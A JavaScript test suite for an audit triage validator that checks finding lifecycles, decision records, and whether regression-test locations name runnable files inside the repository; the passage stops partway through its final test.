// T8 — triage (aperio-continuous-audit-tests.md T8.1-T8.3;
// aperio-continuous-audit.md Step 8). Pure validation: no GitHub, no cloud
// provider, no model, no server/MCP process. Reuses audit/scripts/schema.js's
// status vocabulary and transition table instead of inventing a second one.
//
// The one exception is checkPublicExport, which resolves a finding's file:line
// anchors against the audited tree through an injectable resolver. Every test
// about disclosure or summary sanitation injects a stub, so only the two
// anchor tests near the end of the T8.2 block touch the real checkout.

import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync } from "node:fs";
import {
  CONFIRMED_OUTCOMES,
  CODE_FIX_OUTCOMES,
  NO_CODE_FIX_OUTCOMES,
  TRIAGE_DECISION_REQUIRED_FIELDS,
  DISCLOSURE_CLASSIFICATIONS,
  DISCLOSURE_REQUIRED_SEVERITIES,
  SECRET_PATTERNS,
  PAYLOAD_PATTERNS,
  SHARED_PHRASE_WORDS,
  EXPORTABLE_STATUSES,
  checkFindingTriage,
  checkWaveTriage,
  checkPublicExport,
  looksLikeTestFile,
} from "../scripts/triage.js";
import { SCHEMA, transitionFinding } from "../scripts/schema.js";
import { RUNNABLE_COMMAND } from "../scripts/record-shapes.js";

/**
 * The §7 confirmation facts every record past Candidate asserts it recorded.
 * Kept as one block because that is what they are: a record either cleared the
 * Finding Exit Gate or it did not, and a fixture carrying half of them would
 * be the truncated ledger row these gates exist to catch.
 */
function confirmedRecordFacts() {
  return {
    confidence: "high",
    affectedPaths: [{ file: "db/migrations-sqlite/004_wiki.sql", line: 1 }],
    violatedInvariant: "every migration in db/migrations/ has a mirror in db/migrations-sqlite/",
    expected: "the parity check reports 004 as mirrored on both backends",
    actual: "004 exists only on the Postgres side and the check passes anyway",
    reproduction: "npm run test:audit -- --grep database-contract",
    evidence: "db/migrations/ lists 004_wiki.sql with no counterpart under db/migrations-sqlite/",
    suggestedMitigation: "add the SQLite mirror and make the parity check fail on an unmatched name",
    revision: "f01b78dc",
    variantsConsidered: ["SQLite", "Postgres"],
    duplicateSearch: { classification: "Distinct", matches: [], relatedBySymptom: [] },
    model: "claude-opus-5",
    tokens: { input: 4200, cachedInput: 0, cacheCreationInput: 0, reasoning: 0, output: 800 },
  };
}

/** A Confirmed finding that triage moved to Planned, with everything Step 8 asks for. */
function plannedFinding(overrides = {}) {
  return {
    id: "A14-F1",
    title: "SQLite migration 004 has no Postgres mirror",
    impact: "the two backends drift apart silently at runtime",
    severity: "high",
    status: "Planned",
    ...confirmedRecordFacts(),
    history: [
      { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
      { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
    ],
    regressionTestLocation: "audit/tests/database-contract.test.js",
    regressionTestAssertion: "assert the parity check names 004 as unmatched before the mirror is added",
    triage: { outcome: "Planned", owner: "lkikov", date: "2026-08-21" },
    ...overrides,
  };
}

/** The same record, triaged as an accepted risk instead of code work. */
function acceptedRiskFinding(overrides = {}) {
  const { triage, ...rest } = overrides;
  return {
    ...plannedFinding(rest),
    id: "A03-F2",
    status: "AcceptedRisk",
    history: [
      { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
      { from: "Confirmed", to: "AcceptedRisk", at: "2026-08-21T09:00:00Z" },
    ],
    triage: {
      outcome: "AcceptedRisk", owner: "lkikov", date: "2026-08-21",
      noRegressionTestRationale: "single-user loopback deployments cannot reach this path at all",
      ...triage,
    },
  };
}

describe("T8 — schema extension: the two triage outcomes the §3.4 diagram predates", () => {
  test("DocumentationOnly and IssueFiled are part of the ONE lifecycle graph, not a second list", () => {
    assert.ok(SCHEMA.STATUSES.includes("DocumentationOnly"));
    assert.ok(SCHEMA.STATUSES.includes("IssueFiled"));
    assert.deepStrictEqual(CONFIRMED_OUTCOMES, SCHEMA.TRANSITIONS.Confirmed);
  });

  test("the five T8.1 outcomes are exactly the edges leaving Confirmed", () => {
    assert.deepStrictEqual([...CONFIRMED_OUTCOMES].sort(), [
      "AcceptedRisk", "DocumentationOnly", "Duplicate", "IssueFiled", "Planned",
    ]);
  });

  test("code-fix outcomes are DERIVED from the graph's `-> Fixed` edges, not hand-listed", () => {
    assert.deepStrictEqual([...CODE_FIX_OUTCOMES].sort(), ["IssueFiled", "Planned"]);
    assert.deepStrictEqual([...NO_CODE_FIX_OUTCOMES].sort(), ["AcceptedRisk", "DocumentationOnly"]);
  });

  test("every outcome falls into exactly one bucket — none is left owing neither a test nor a reason", () => {
    for (const outcome of CONFIRMED_OUTCOMES) {
      const buckets = [CODE_FIX_OUTCOMES.includes(outcome), NO_CODE_FIX_OUTCOMES.includes(outcome),
        outcome === "Duplicate"].filter(Boolean);
      assert.strictEqual(buckets.length, 1, `${outcome} belongs to ${buckets.length} buckets`);
    }
  });

  test("transitionFinding accepts the new outcomes and keeps DocumentationOnly terminal", () => {
    const confirmed = { id: "F1", status: "Confirmed" };
    assert.strictEqual(transitionFinding(confirmed, "DocumentationOnly").ok, true);
    assert.strictEqual(transitionFinding(confirmed, "IssueFiled").ok, true);

    const documented = { id: "F1", status: "DocumentationOnly" };
    for (const to of SCHEMA.STATUSES) {
      assert.strictEqual(transitionFinding(documented, to).ok, false, `DocumentationOnly -> ${to} must be refused`);
    }
  });

  test("IssueFiled is NOT terminal — a filed issue is work still owed", () => {
    const filed = { id: "F1", status: "IssueFiled" };
    assert.strictEqual(transitionFinding(filed, "Fixed").ok, true);
    assert.strictEqual(transitionFinding(filed, "Reopened").ok, false);
  });
});

describe("T8.1 — every confirmed finding has exactly one outcome", () => {
  test("a fully triaged Planned finding passes", () => {
    const result = checkFindingTriage(plannedFinding());
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
    assert.strictEqual(result.classification, "triaged");
    assert.strictEqual(result.outcome, "Planned");
  });

  test("a finding still at Confirmed is orphaned, never ok", () => {
    const result = checkFindingTriage({ ...plannedFinding(), status: "Confirmed", triage: undefined });
    assert.strictEqual(result.classification, "orphaned");
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /Confirmed with no recorded outcome/);
  });

  test("a finding still at Candidate is untriaged, never ok — triage never reached it", () => {
    const result = checkFindingTriage({ ...plannedFinding(), status: "Candidate", triage: undefined });
    assert.strictEqual(result.classification, "untriaged");
    assert.strictEqual(result.ok, false);
  });

  test("Rejected needs no owner/date — T6.2's evidence gate rejected it, not a human", () => {
    const result = checkFindingTriage({
      id: "A14-F9", status: "Rejected",
      history: [{ from: "Candidate", to: "Rejected", at: "2026-08-20T10:00:00Z" }],
    });
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
    assert.strictEqual(result.classification, "rejected");
  });

  test("a bare Rejected stub is refused — it must still record the rejection edge", () => {
    // The bypass this replaces: `{ id, status: "Rejected" }` returned ok with
    // nothing behind it, so a truncated ledger could swap a real finding for a
    // stub and still receive full coverage credit at closeout.
    const stub = checkFindingTriage({ id: "A14-F9", status: "Rejected" });
    assert.strictEqual(stub.ok, false);
    assert.match(stub.errors.join("\n"), /carries no status trail/);

    const wave = checkWaveTriage([{ id: "A14-F9", status: "Rejected" }],
      { expectedFindingIds: ["A14-F9"] });
    assert.strictEqual(wave.ok, false, "a wave must not close on a rejected stub");
  });

  test("a truncated triaged record gets no coverage credit — the trail is not the record", () => {
    // The gap this closes: a Planned/IssueFiled row carrying only an id, a
    // status, a legal history, a triage owner/date, and the regression-test
    // fields used to pass every per-finding check and close the wave clean. It
    // has no confidence, no affectedPaths, no invariant, no reproduction, no
    // evidence, no impact, no mitigation — the same "stub earns full credit"
    // failure the rejected-stub rule above was written to stop, arriving by the
    // triaged door instead.
    for (const status of CODE_FIX_OUTCOMES) {
      const truncated = {
        id: "A14-F1", status,
        history: [
          { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
          { from: "Confirmed", to: status, at: "2026-08-21T09:00:00Z" },
        ],
        regressionTestLocation: "audit/tests/database-contract.test.js",
        regressionTestAssertion: "assert the parity check names 004 as unmatched",
        triage: { outcome: status, owner: "lkikov", date: "2026-08-21" },
      };

      const result = checkFindingTriage(truncated);
      assert.strictEqual(result.ok, false, `a truncated ${status} record must not pass`);
      for (const field of ["confidence", "affectedPaths", "violatedInvariant", "evidence", "impact"]) {
        assert.match(result.errors.join("\n"), new RegExp(`missing required field: ${field}`));
      }

      const wave = checkWaveTriage([truncated], { expectedFindingIds: ["A14-F1"] });
      assert.strictEqual(wave.ok, false, `a wave must not close on a truncated ${status} row`);
    }
  });

  test("a record on the triaged path that does not hold up is bucketed invalid", () => {
    // The miscount this closes: the triaged return was unconditional, so a
    // record that failed every check it faced still landed in the wave's public
    // `triaged` bucket. `ok` said no and the count said yes, and a closeout
    // reads the count.
    const broken = {
      id: "A14-F1", status: "Planned",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
      ],
      regressionTestLocation: "audit/tests/database-contract.test.js",
      regressionTestAssertion: "assert the parity check names 004 as unmatched",
      triage: { outcome: "Planned", owner: "lkikov", date: "2026-08-21" },
    };
    assert.strictEqual(checkFindingTriage(broken).classification, "invalid");

    // A missing decision record lands the same way — it is the OTHER return on
    // this path, and it was labelled triaged too.
    const noDecision = { ...plannedFinding(), triage: undefined };
    assert.strictEqual(checkFindingTriage(noDecision).classification, "invalid");

    // And the wave counts it where it belongs.
    const wave = checkWaveTriage([broken], { expectedFindingIds: ["A14-F1"] });
    assert.deepStrictEqual(wave.triaged, []);
    assert.deepStrictEqual(wave.invalid, ["A14-F1"]);
    assert.strictEqual(wave.ok, false);

    // A record that DOES hold up is still triaged, outcome and all.
    const good = checkFindingTriage(plannedFinding());
    assert.strictEqual(good.classification, "triaged");
    assert.strictEqual(good.outcome, "Planned");
  });

  test("a triaged record whose confirmation fields are whitespace is refused", () => {
    // Presence is not an answer. schema.js's validateFinding() accepts "   "
    // because it only tests for undefined/null/"", so without §7's field checks
    // a record can be blank in every box that matters and still read as
    // triaged.
    const result = checkFindingTriage(plannedFinding({
      violatedInvariant: "   ", evidence: "\t", impact: " ",
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /violatedInvariant must be a non-empty string/);
    assert.match(result.errors.join("\n"), /evidence must be a non-empty string/);
  });

  test("an anchor pointing at no line is refused, whatever its JavaScript type", () => {
    for (const line of [0, -3, 1.5]) {
      const result = checkFindingTriage(plannedFinding({
        affectedPaths: [{ file: "db/migrations-sqlite/004_wiki.sql", line }],
      }));
      assert.strictEqual(result.ok, false, `line ${line} must be refused`);
      assert.match(result.errors.join("\n"), /must be a whole line number of 1 or more/);
    }
  });

  test("Rejected stays exempt from the confirmation record — it was never confirmed", () => {
    // The other half of the rule above: T6.2 rejects candidates cheaply on
    // purpose, so demanding a complete confirmation record of a record that
    // never cleared the gate would make the cheap outcome the expensive one.
    const result = checkFindingTriage({
      id: "A14-F9", status: "Rejected",
      history: [{ from: "Candidate", to: "Rejected", at: "2026-08-20T10:00:00Z" }],
    });
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.ok, true);
  });

  test("a Rejected record whose trail records no rejection edge is refused", () => {
    // Confirmed -> Rejected is not an edge the lifecycle graph has, so the
    // trail rules catch this one first. The assertion is that the record is
    // refused, not which rule refuses it.
    const forged = checkFindingTriage({
      id: "A14-F9", status: "Rejected",
      history: [{ from: "Confirmed", to: "Rejected", at: "2026-08-20T10:00:00Z" }],
    });
    assert.strictEqual(forged.ok, false);
  });

  test("two recorded outcomes leaving Confirmed are rejected — `status` shows only the last one", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "AcceptedRisk", at: "2026-08-21T09:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-22T09:00:00Z" },
      ],
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /2 recorded outcomes leave Confirmed \(AcceptedRisk, Planned\)/);
  });

  test("an outcome status with NO transition out of Confirmed is rejected", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [{ from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" }],
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /no recorded transition leaves Confirmed/);
  });

  test("a missing history is rejected, not read as zero outcomes", () => {
    const result = checkFindingTriage(plannedFinding({ history: undefined }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /history must be an array of readable \{from, to\} transitions/);
  });

  test("an unreadable history entry fails closed — a second outcome must not decode away", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" },
        null,
      ],
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /history must be an array of readable/);
  });

  test("a missing triage decision record is rejected", () => {
    const result = checkFindingTriage(plannedFinding({ triage: undefined }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /triage must be a decision record object/);
  });

  test("an array is not a decision record", () => {
    const result = checkFindingTriage(plannedFinding({ triage: [] }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /triage must be a decision record object/);
  });

  for (const field of TRIAGE_DECISION_REQUIRED_FIELDS) {
    test(`triage.${field} is required`, () => {
      const finding = plannedFinding();
      delete finding.triage[field];
      const result = checkFindingTriage(finding);
      assert.strictEqual(result.ok, false);
      assert.match(result.errors.join("\n"), new RegExp(`triage is missing required field: ${field}`));
    });
  }

  test("an owner that names nobody is rejected — blank, placeholder, and object alike", () => {
    for (const owner of ["   ", "TBD", "n/a", "unknown", {}, []]) {
      const result = checkFindingTriage(plannedFinding({
        triage: { outcome: "Planned", owner, date: "2026-08-21" },
      }));
      assert.strictEqual(result.ok, false, `owner ${JSON.stringify(owner)} must be refused`);
    }
  });

  test("a date that pins the decision to no day is rejected", () => {
    for (const date of ["soon", "this week", "2026-13-01", "2026-02-31", "21/08/2026", 20260821]) {
      const result = checkFindingTriage(plannedFinding({
        triage: { outcome: "Planned", owner: "lkikov", date },
      }));
      assert.strictEqual(result.ok, false, `date ${JSON.stringify(date)} must be refused`);
    }
  });

  test("a full ISO timestamp is a real day and is accepted", () => {
    for (const date of ["2026-08-21T09:00:00Z", "2026-08-21T09:00Z", "2026-08-21T09:00:00+02:00",
      "2026-08-21T09:00:00.500Z"]) {
      const result = checkFindingTriage(plannedFinding({
        triage: { outcome: "Planned", owner: "lkikov", date },
      }));
      assert.deepStrictEqual(result.errors, [], `${date} should be accepted`);
    }
  });

  test("a date with anything trailing it is refused — the WHOLE value must be the date", () => {
    // The bypass this replaces: only the first ten characters were parsed, so a
    // corrupted or half-templated field read as a clean decision date.
    // "2026-08-21T09:00:00" is the case Date.parse alone would wave through:
    // it parses fine, as LOCAL time, so the same ledger row means a different
    // instant on every machine that reads it — precisely the reconciliation
    // this field exists to support. A timestamp must name its zone.
    for (const date of ["2026-08-21garbage", "2026-08-21Tnot-a-time", "2026-08-21 or so",
      "2026-08-21T09:00:00Zextra", "2026-08-21T25:99Z", "2026-08-2", "2026-08-21T09:00:00"]) {
      const result = checkFindingTriage(plannedFinding({
        triage: { outcome: "Planned", owner: "lkikov", date },
      }));
      assert.strictEqual(result.ok, false, `${JSON.stringify(date)} must be refused`);
    }
  });

  test("the decision record and the lifecycle trail must name the same outcome", () => {
    const result = checkFindingTriage(plannedFinding({
      triage: { outcome: "AcceptedRisk", owner: "lkikov", date: "2026-08-21" },
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /must name the same outcome/);
  });

  test("an outcome outside the lifecycle graph is rejected", () => {
    const result = checkFindingTriage(plannedFinding({
      triage: { outcome: "WontFix", owner: "lkikov", date: "2026-08-21" },
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /triage\.outcome must be one of/);
  });

  test("a Duplicate that names nothing on the other end is rejected", () => {
    const duplicate = {
      ...plannedFinding(),
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21" },
    };
    const result = checkFindingTriage(duplicate);
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /must name the record it duplicates/);

    duplicate.triage.duplicateOf = "F-R2-01";
    assert.deepStrictEqual(checkFindingTriage(duplicate).errors, []);
  });

  test("a Duplicate that names ITSELF is refused — nobody would own the fix", () => {
    // The bypass this replaces: duplicateOf was only checked for being a
    // non-placeholder string, so pointing a finding at its own id closed it as
    // already-tracked, tracked by itself.
    const base = {
      ...plannedFinding(),
      id: "A14-F1",
      status: "Duplicate",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Duplicate", at: "2026-08-21T09:00:00Z" },
      ],
    };
    for (const duplicateOf of ["A14-F1", "  a14-f1  "]) {
      const result = checkFindingTriage({
        ...base,
        triage: { outcome: "Duplicate", owner: "lkikov", date: "2026-08-21", duplicateOf },
      });
      assert.strictEqual(result.ok, false, `${JSON.stringify(duplicateOf)} must be refused`);
      assert.match(result.errors.join("\n"), /names itself as the record it duplicates/);
    }
  });

  test("a Fixed finding reads its outcome from the trail, not from `status`", () => {
    const result = checkFindingTriage(plannedFinding({
      status: "Fixed",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "IssueFiled", at: "2026-08-21T09:00:00Z" },
        { from: "IssueFiled", to: "Fixed", at: "2026-08-22T09:00:00Z" },
      ],
      triage: { outcome: "IssueFiled", owner: "lkikov", date: "2026-08-21" },
    }));
    assert.deepStrictEqual(result.errors, []);
    assert.strictEqual(result.outcome, "IssueFiled");
  });

  test("the trail must end where the finding says it is", () => {
    // The bypass this replaces: only triage.outcome and the Confirmed edge were
    // compared, so status "AcceptedRisk" over a trail ending at Planned read as
    // ok — leaving the closeout free to count the same record either way. The
    // rule is T6's (slice-execution.js historyErrors), reused rather than
    // restated.
    const result = checkFindingTriage({
      ...plannedFinding(),
      status: "AcceptedRisk",
    });
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"),
      /history ends at Planned, but the finding's status is AcceptedRisk/);
  });

  test("an illegal edge anywhere in the trail is rejected", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Fixed", at: "2026-08-21T09:00:00Z" },
        { from: "Fixed", to: "Planned", at: "2026-08-22T09:00:00Z" },
      ],
    }));
    assert.strictEqual(result.ok, false);
  });

  test("a disconnected trail is rejected — the entries must form one path", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Duplicate", to: "Planned", at: "2026-08-21T09:00:00Z" },
      ],
    }));
    assert.strictEqual(result.ok, false);
  });

  test("a trail that never starts at Candidate is rejected — it skipped the evidence gate", () => {
    // The bypass this replaces: `[{ from: "Confirmed", to: "Planned" }]` is a
    // legal, connected trail that ends where the status says, so every T6 rule
    // passed and a hand-authored status plus outcome collected full wave
    // coverage without the record ever recording a confirmation.
    const result = checkFindingTriage(plannedFinding({
      history: [{ from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" }],
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /status trail begins at "Confirmed", not Candidate/);

    // The wave gate reads the same rule, so the record earns no coverage there
    // either — it is counted as present but the wave does not close.
    const wave = checkWaveTriage(
      [plannedFinding({ history: [{ from: "Confirmed", to: "Planned", at: "2026-08-21T09:00:00Z" }] })],
      { expectedFindingIds: ["A14-F1"] },
    );
    assert.strictEqual(wave.ok, false);
    assert.match(wave.errors.join("\n"), /not\s+Candidate/);
  });

  test("an undated transition is rejected — the trail cannot be ordered", () => {
    const result = checkFindingTriage(plannedFinding({
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "Planned", at: "whenever" },
      ],
    }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /must be a readable timestamp/);
  });

  test("an unreadable record is invalid, never bucketed by guesswork", () => {
    for (const bad of [null, "A14-F1", [], 7]) {
      assert.strictEqual(checkFindingTriage(bad).classification, "invalid");
    }
    assert.strictEqual(checkFindingTriage({ status: "Planned" }).classification, "invalid");
    assert.strictEqual(checkFindingTriage({ id: "F1", status: "Triaged" }).classification, "invalid");
  });
});

describe("T8.3 — a code finding owns a red regression test", () => {
  test("a location that is prose, not a path, is rejected", () => {
    for (const location of ["a unit test", "tests/", "add a test to paths.test.js", "", {}]) {
      const result = checkFindingTriage(plannedFinding({ regressionTestLocation: location }));
      assert.strictEqual(result.ok, false, `${JSON.stringify(location)} must be refused`);
      assert.match(result.errors.join("\n"), /must name a concrete test file/);
    }
  });

  test("a path to production code is rejected — no assertion can be written there", () => {
    const result = checkFindingTriage(plannedFinding({ regressionTestLocation: "lib/routes/paths.js" }));
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /must name a concrete test file/);
  });

  test("every suite this repository actually runs is accepted", () => {
    for (const location of [
      "audit/tests/triage.test.js", "tests/harness/agent.test.js",
      "tests/unit/tools/memory.test.js", "tests/integration/store/store.test.js",
      "tests/e2e/real-app/real-app-boot.test.js", "tests/docint/grading.test.js",
      "tests/browser/dashboard.spec.ts",
    ]) {
      assert.strictEqual(looksLikeTestFile(location), true, `${location} should read as a test file`);
    }
    for (const location of ["lib/routes/paths.js", "README.md", "tests", "a test", "  "]) {
      assert.strictEqual(looksLikeTestFile(location), false, `${location} should not read as a test file`);
    }
  });

  test("a test location no configured command executes is refused", () => {
    // The bypass this replaces: "under a tests/ directory, or with a .test.
    // infix" is a CONVENTION, and a convention is not a runner. Each path below
    // satisfied it while sitting outside every directory `npm test` walks and
    // outside the explicit `test:audit` file list, so a code finding could close
    // T8.3 promising a red test that no CI run would ever execute — the same
    // empty promise as naming a path outside the checkout.
    for (const location of [
      "scratch/tests/foo.test.js", "node_modules/pkg/tests/foo.test.js",
      "lib/foo.test.js", "src/__tests__/store.js", "lib/paths.spec.ts",
      "tests/foo.test.js", "audit/scripts/triage.test.js",
    ]) {
      assert.strictEqual(looksLikeTestFile(location), false,
        `${location} sits outside every configured suite root`);
      const result = checkFindingTriage(plannedFinding({ regressionTestLocation: location }));
      assert.strictEqual(result.ok, false, `${location} must be refused`);
      assert.match(result.errors.join("\n"), /must name a concrete test file/);
    }

    // Right root, wrong filename: scripts/run-tests.js collects `*.test.js` and
    // nothing else, so a grader module under tests/docint/ is imported by the
    // suite, never run as one.
    assert.strictEqual(looksLikeTestFile("tests/docint/grading.mjs"), false);
    assert.strictEqual(looksLikeTestFile("tests/unit/helpers.js"), false);
  });

  test("a document or data file under tests/ is not somewhere an assertion can go", () => {
    // The bypass this replaces: the tests/ directory alone made a path pass, so
    // a wave could close having named a README as the home of the red test.
    for (const location of [
      "tests/README.md", "tests/fixture.json", "tests/unit/cases.yaml",
      "tests/snapshot.txt", "tests/data.sql", "audit/tests/notes.md",
    ]) {
      assert.strictEqual(looksLikeTestFile(location), false,
        `${location} names no place a regression assertion can run`);
    }
  });

  test("a location outside the checkout is rejected — the suite would never run it", () => {
    // The bypass this replaces: the extension and tests/ conventions both hold
    // for a path that leaves the repository, so a wave could close promising a
    // red test at a location no CI run reaches.
    for (const location of [
      "../../tests/ghost.js", "audit/../../tests/ghost.test.js",
      "/Users/someone/scratch/ghost.test.js", "C:/tmp/ghost.test.js",
      "C:\\tmp\\ghost.test.js", "~/ghost.test.js",
    ]) {
      assert.strictEqual(looksLikeTestFile(location), false,
        `${location} names a file the repository's own suite cannot run`);
      const result = checkFindingTriage(plannedFinding({ regressionTestLocation: location }));
      assert.strictEqual(result.ok, false, `${location} must be refused`);
      assert.match(result.errors.join("\n"), /must name a concrete test file/);
    }

    // A repository-relative path containing no `..` is still accepted, dot-slash
    // prefix and all — the rule is "inside the checkout", not "no punctuation".
    assert.strictEqual(looksLikeTestFile("./audit/tests/triage.test.js"), true);
  });

  test("a URI is not a repository path, whatever its scheme", () => {
    // The same escape wearing different clothes: a URI is neither slash-prefixed
    // nor drive-prefixed, and it carries a `tests` segment that satisfied the
    // directory convention, so it closed a code finding with a test location
    // nothing in this checkout can resolve.
    for (const location of [
      "https://example.com/tests/foo.test.js", "http://example.com/tests/foo.test.js",
      "file://tests/foo.js", "file:///tmp/tests/foo.js",
      "data:text/plain,tests/a.test.js", "git+ssh://host/repo/tests/a.test.js",
    ]) {
      assert.strictEqual(looksLikeTestFile(location), false,
        `${location} is a URI, not a path this repository can resolve`);
      const result = checkFindingTriage(plannedFinding({ regressionTestLocation: location }));
      assert.strictEqual(result.ok, false, `${location} must be refused`);
      assert.match(result.errors.join("\n"), /must name a concrete test file/);
    }
  });

  test("the test file is NOT required to exist — a red test that is already written is not red", () => {
    // The path below is deliberately a file this repository does not have.
    assert.strictEqual(looksLikeTestFile("audit/tests/not-written-yet.test.js"), true);
    const result = checkFindingTriage(plannedFinding({
      regressionTestLocation: "audit/tests/not-written-yet.test.js",
    }));
    assert.deepStrictEqual(result.errors, []);
  });

  test("every accepted test root is actually collected by a configured command", () => {
    // The gate promises "a regression test CI will run". audit/tests only keeps
    // that promise while `test:audit` COLLECTS the directory; when the script
    // named each file, a new *.test.js there passed the gate and was then
    // silently skipped by every run — a promised red test nobody executes.
    // TEST_SUITE_ROOTS is a hand-kept table, so this is the one check that can
    // notice the script drifting back to an explicit list.
    const pkg = JSON.parse(readFileSync(new URL("../../package.json", import.meta.url), "utf8"));
    const audit = pkg.scripts["test:audit"];
    assert.ok(audit.includes("scripts/run-tests.js") && audit.includes("audit/tests"),
      `test:audit must hand audit/tests to the recursive collector: ${audit}`);
    // A per-file list is the drift itself: it is what let a new test file pass
    // this gate and be skipped by every run.
    assert.ok(!/audit\/tests\/\S+\.test\.js/.test(audit),
      `test:audit must not enumerate individual files: ${audit}`);
    // Every file the gate would accept is one that command already runs.
    for (const name of readdirSync(new URL("../", import.meta.url)).filter((f) => f.endsWith(".test.js"))) {
      assert.strictEqual(looksLikeTestFile(`audit/tests/${name}`), true, `${name} should read as a test file`);
    }
  });

  test("a nested audit test is accepted, and the command that runs it descends", () => {
    // The roots table matches on a PREFIX, so the moment audit/tests is accepted
    // so is audit/tests/security/foo.test.js. Only a RECURSIVE collector keeps
    // that honest — `scripts/run-tests.js` walks directories itself, which is
    // also why it needs no minimum Node floor at all — unlike `node --test`,
    // whose own glob expansion only arrived in Node 22.
    assert.strictEqual(looksLikeTestFile("audit/tests/security/disclosure.test.js"), true);
    const pkg = JSON.parse(readFileSync(new URL("../../package.json", import.meta.url), "utf8"));
    const audit = pkg.scripts["test:audit"];
    assert.ok(audit.includes("scripts/run-tests.js"),
      `a nested location may only be accepted while a recursive collector runs the root: ${audit}`);
    assert.ok(!audit.includes("*"),
      `a glob is not portable to the documented Node floor — enumerate in JS instead: ${audit}`);
  });

  test("a missing or placeholder assertion design is rejected", () => {
    for (const assertion of [undefined, "  ", "TBD", "todo", "n/a", "see above", {}]) {
      const result = checkFindingTriage(plannedFinding({ regressionTestAssertion: assertion }));
      assert.strictEqual(result.ok, false, `${JSON.stringify(assertion)} must be refused`);
      assert.match(result.errors.join("\n"), /must design the failing assertion/);
    }
  });

  test("pasting the finding's own title or impact into the assertion field is rejected", () => {
    const base = plannedFinding();
    for (const field of ["title", "impact"]) {
      const result = checkFindingTriage(plannedFinding({ regressionTestAssertion: `  ${base[field].toUpperCase()} ` }));
      assert.strictEqual(result.ok, false);
      assert.match(result.errors.join("\n"), new RegExp(`repeats the finding's own ${field} verbatim`));
    }
  });

  test("IssueFiled owes the same red test as Planned", () => {
    const filed = plannedFinding({
      status: "IssueFiled",
      history: [
        { from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" },
        { from: "Confirmed", to: "IssueFiled", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "IssueFiled", owner: "lkikov", date: "2026-08-21" },
      regressionTestAssertion: undefined,
    });
    const result = checkFindingTriage(filed);
    assert.strictEqual(result.ok, false);
    assert.match(result.errors.join("\n"), /outcome IssueFiled is code work/);
  });

  test("AcceptedRisk and DocumentationOnly must explain why no regression test applies", () => {
    for (const outcome of NO_CODE_FIX_OUTCOMES) {
      const finding = acceptedRiskFinding();
      finding.status = outcome;
      finding.history[1].to = outcome;
      finding.triage.outcome = outcome;
      assert.deepStrictEqual(checkFindingTriage(finding).errors, [], `${outcome} with a rationale passes`);

      delete finding.triage.noRegressionTestRationale;
      const result = checkFindingTriage(finding);
      assert.strictEqual(result.ok, false);
      assert.match(result.errors.join("\n"), /must explain why no code regression test applies/);
    }
  });

  test("a placeholder rationale is not an explanation", () => {
    for (const rationale of ["n/a", "none", "TBD", "  ", "-"]) {
      const result = checkFindingTriage(acceptedRiskFinding({ triage: { noRegressionTestRationale: rationale } }));
      assert.strictEqual(result.ok, false, `${JSON.stringify(rationale)} must be refused`);
    }
  });

  test("a rationale that merely CONTAINS a placeholder word is a real answer", () => {
    const result = checkFindingTriage(acceptedRiskFinding({
      triage: { noRegressionTestRationale: "none of the supported deployments can reach this code path" },
    }));
    assert.deepStrictEqual(result.errors, []);
  });

  test("a Duplicate owes neither a test nor a rationale — the linked record owns both", () => {
